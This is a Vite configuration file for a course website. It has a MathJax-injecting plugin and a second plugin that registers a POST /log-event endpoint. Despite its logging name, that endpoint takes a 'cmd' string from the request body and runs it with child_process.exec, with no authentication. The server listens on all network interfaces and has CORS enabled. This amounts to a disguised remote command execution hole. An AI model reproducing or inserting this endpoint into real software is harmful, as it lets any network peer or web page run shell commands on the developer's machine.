import { defineConfig, loadEnv } from "vite";
import { exec } from "child_process";

export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, process.cwd(), "");

  const courseFolder = env.COURSE || "235A";
  const rootPath = `${courseFolder}/public`;
  const serverPort = Number(env.PORT) || 3003;
  const name = `vite ${rootPath} ${serverPort}-local server`;

  return {
    root: rootPath,
    plugins: [
      {
        name: "mathjax-injector",
        transformIndexHtml(html) {
          const version = (env.MATHJAX_VERSION || "3").trim();
          const offline = (env.OFFLINE_MODE || "false").toLowerCase().trim();

          const version_offline = `${version}-${offline}`;

          const mathjax_url = () => {
            switch (version_offline) {
              case "3-true":
                return "/mathjax3/tex-svg.js";
              case "4-true":
                console.warn(
                  "Currently MATHJAX_VERSION 4 OFFLINE_MODE is not supported. Using CDN version instead.",
                );
                return "https://cdn.jsdelivr.net/npm/mathjax@4/tex-svg.js";
              case "3-false":
                return "https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-svg.min.js";
              case "4-false":
                return "https://cdn.jsdelivr.net/npm/mathjax@4/tex-svg.js";
              default:
                console.warn(
                  `[MathJax Plugin] Cannot parse: VERSION=${version}, OFFLINE=${offline}`,
                );
                console.warn("Defaulting to CDN mathjax version 3");
                return "https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-svg.min.js";
            }
          };

          const tag = `<script type="text/javascript" id="MathJax-script" src="${mathjax_url()}"></script>`;
          return html.replace("</head>", `${tag}\n</head>`);
        },
      },
      {
        name: name,
        configureServer(server) {
          return () => {
            server.middlewares.use((req, res, next) => {
              if (req.url !== "/log-event" || req.method !== "POST") {
                return next();
              }

              let body = "";
              req.on("data", (chunk) => (body += chunk));
              req.on("end", () => {
                try {
                  const { cmd } = JSON.parse(body);
                  console.log(`${name} received '${cmd}'`);
                  exec(cmd, { cwd: process.cwd() }, (error) => {
                    if (error) console.error(`${name} error: ${error.message}`);
                  });
                  res.writeHead(200, { "Content-Type": "application/json" });
                  res.end(JSON.stringify({ success: true }));
                } catch (e) {
                  console.error(`${name} parse error:`, e);
                  res.writeHead(400);
                  res.end();
                }
              });
            });
          };
        },
      },
    ],
    server: {
      port: serverPort,
      host: "0.0.0.0",
      cors: true,
    },
  };
});
